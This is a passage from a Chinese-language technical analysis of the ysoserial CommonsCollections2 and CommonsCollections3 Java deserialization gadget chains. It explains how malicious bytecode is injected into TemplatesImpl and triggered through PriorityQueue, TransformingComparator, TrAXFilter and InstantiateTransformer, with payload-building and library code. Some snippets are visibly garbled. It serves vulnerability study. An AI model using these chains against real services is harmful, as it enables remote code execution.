                                                    //insertAfter() -> 插入代码。
                                                    //此段代码是将cmd变量中的代码，注入到StubTransletPayload类中的静态代码块中。
    clazz.setName("ysoserial.Pwner" + System.nanoTime());  //修改类名（暂不清楚具体作用是什么）
    CtClass superC = pool.get(abstTranslet.getName());  //获取org.apache.xalan.xsltc.runtime.AbstractTranslet对象（StubTransletPayload继承于org.apache.xalan.xsltc.runtime.AbstractTranslet)
    clazz.setSuperclass(superC);  //将org.apache.xalan.xsltc.runtime.AbstractTranslet设置为StubTransletPayload的父类。
    final byte[] classBytes = clazz.toBytecode();  将StubTransletPayload对象转换成byte数组。
    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes, ClassFiles.classAsBytes(Foo.class)});  //通过反射将StubTransletPayload对象的byte流赋值给_bytecodes属性中。
    Reflections.setFieldValue(templates, "_name", "Pwnr");  //反射赋值
    Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());  //反射赋值工厂类。
总结上述流程，通过利用Javasist库，将恶意代码注入到自定义的StubTransletPayload类中，并将StubTransletPayload类转换成byte数组，通过反射赋值给org.apache.xalan.xsltc.trax.TemplatesImpl类中的
**bytecodes** 属性，最终返回TemplatesImpl对象。
此时，当实例化org.apache.xalan.xsltc.trax.TemplatesImpl类中的 **bytecodes**
属性中的类，即可触发恶意代码执行。作者找到了TemplatesImpl# **newTransformer**
方法加载_bytecodes中的byte字节流。
    public synchronized Transformer newTransformer() throws TransformerConfigurationException
    {
        TransformerImpl transformer;
        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);
        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }
        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
重点跟进分析调用的 **getTransletInstance** 方法。
    private Translet getTransletInstance() throws TransformerConfigurationException {
        try {
            if (_name == null) return null;
            if (_class == null) defineTransletClasses();
            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }
            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
首先调用defineTransletClasses()方法加载_bytecodes。
    private void defineTransletClasses() throws TransformerConfigurationException {
        if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }
        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });
        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];
            if (classCount > 1) {
                _auxClasses = new HashMap<>();
            }
            for (int i = 0; i >> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
调用 **siftDown(i, (E) queue[i])** 方法。
    private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
这里存在一个判断逻辑，判断条件是PriorityQueue#comparator是否为空，执行siftDownUsingComparator方法。
进入siftDownUsingComparator方法中。
    private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k  0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) 
transformer)构造方法，可以为this.transformer赋值。
    public TransformingComparator(Transformer transformer) {
        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
    }
    public TransformingComparator(Transformer transformer, Comparator decorated) {
        this.decorated = decorated;
        this.transformer = transformer;
    }public TransformingComparator(Transformer transformer) {    this(transformer, ComparatorUtils.NATURAL_COMPARATOR);}
    public TransformingComparator(Transformer transformer, Comparator decorated) {    this.decorated = decorated;    this.transformer = transformer;}
通过org.apache.commons.collections4.comparators.TransformingComparator类，满足了条件一（将TemplatesImpl对象作为transform方法的传入参数）和条件三（找到一个可以调用InvokerTransformer#transform(object
input)方法的方式）。至此完成整个利用链的构建。
## **Commons-Collections 3**
CommonsCollections3的source与CommonsCollections1的source相同，都是以sun.reflect.annotation.AnnotationInvocationHandler作为入口，通过创建Map动态代理类，通过调用
**sun.reflect.annotation.AnnotationInvocationHandler**
的invoke方法，从而调用LazyMap#get方法，控制实现Transformer接口下的任意类中的transform方法。
    final Map innerMap = new HashMap();
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
    return handler;
CommonsCollections3的sink点构造思路则是和CommonsCollections2中的base sink点（将恶意字节流注入到
**org.apache.xalan.xsltc.trax.TemplatesImpl** 类中的 **_bytecodes** 属性，等待调用
**TemplatesImpl#newTransformer** 方法）。
    Object templatesImpl = Gadgets.createTemplatesImpl(command);
CommonsCollections3的不同之处在于，Gadget作者找到了
**com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter**
类。在TrAXFilter(Templates templates)构造方法中，调用了templates. **newTransformer()** 方法。
    public TrAXFilter(Templates templates) throws TransformerConfigurationException
    {
        _templates = templates;
        _transformer = (TransformerImpl) templates.newTransformer();
        _transformerHandler = new TransformerHandlerImpl(_transformer);
        _useServicesMechanism = _transformer.useServicesMechnism();
    }
仅需找到可以调用TrAXFilter(恶意Templates对象)方法即可。Gadget作者找到了InstantiateTransformer#transform(object
input)方法，通过调用此方法实现TrAXFilter构造方法的调用。
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[] { Templates.class },new Object[] { templatesImpl } )
        }
    );
与InvokerTransformer#transform方类似，InstantiateTransformer#transform(object
input)方法会调用传入的object对象的构造方法。
    public Object transform(Object input) {
        try {
            if (input instanceof Class == false) {
                throw new FunctorException(
                    "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                        + (input == null ? "null object" : input.getClass().getName()));
            }
            Constructor con = ((Class) input).getConstructor(iParamTypes);
            return con.newInstance(iArgs);
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");